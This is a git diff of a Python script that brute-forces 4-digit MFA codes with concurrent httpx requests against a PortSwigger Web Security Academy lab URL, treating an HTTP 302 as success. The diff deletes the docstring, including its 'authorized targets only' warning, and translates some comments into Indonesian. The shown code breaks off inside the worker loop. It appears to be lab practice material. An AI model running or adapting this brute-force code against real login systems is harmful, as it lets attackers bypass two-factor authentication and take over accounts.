@@ -1,16 +1,4 @@
 #!/usr/bin/env python3
-"""
-fast_mfa_async_302.py
-Asynchronous MFA 4-digit brute force using httpx. Detects success when HTTP status == 302.
-Only use on authorized targets (PortSwigger labs, your own lab, etc).
-
-Requirements:
-    pip install httpx
-
-Usage:
-    python3 fast_mfa_async_302.py
-"""
-
 import asyncio
 import httpx
 import time
@@ -18,7 +6,6 @@ from argparse import ArgumentParser
 from pathlib import Path
 from datetime import datetime, timezone
 
-# ----------------- Defaults (edit or override via CLI) -----------------
 DEFAULT_URL = "https://0a7c003603c017278005e46b00bf0062.web-security-academy.net/login2"
 DEFAULT_COOKIE_HEADER = "verify=carlos"
 DEFAULT_HEADERS = {
@@ -26,11 +13,11 @@ DEFAULT_HEADERS = {
     "Content-Type": "application/x-www-form-urlencoded",
     "Referer": DEFAULT_URL,
 }
-DEFAULT_CONCURRENCY = 50      # number of simultaneous in-flight requests
-DEFAULT_TIMEOUT = 10.0        # per-request timeout (seconds)
+DEFAULT_CONCURRENCY = 50      # jumlah simultaneous in-flight requests
+DEFAULT_TIMEOUT = 10.0        # per-request timeout 
 DEFAULT_START = 0
 DEFAULT_END = 10000           # exclusive
-DEFAULT_DELAY = 0.0           # optional per-request delay (seconds) to be polite
+DEFAULT_DELAY = 0.0           # optional per-request delay to be polite
 LOGDIR = Path("./mfa_results")
 # -----------------------------------------------------------------------
 
@@ -49,10 +36,10 @@ async def worker(name: int, queue: "asyncio.Queue[int]", client: httpx.AsyncClie
         code = await queue.get()
         tries += 1
         try:
-            # send POST; do not follow redirects so we can see 302 directly
+            # send POST; tidak follow redirects supaya bisa menampilkan 302
             r = await client.post(client.base_url, data=make_form(code), timeout=timeout, follow_redirects=False)
             status = r.status_code
-            # If a 302 appears, that's our success condition
+            # succes condition jika 302 muncul
             if status == 302:
                 found = (code, status, datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"))
                 # save a small record
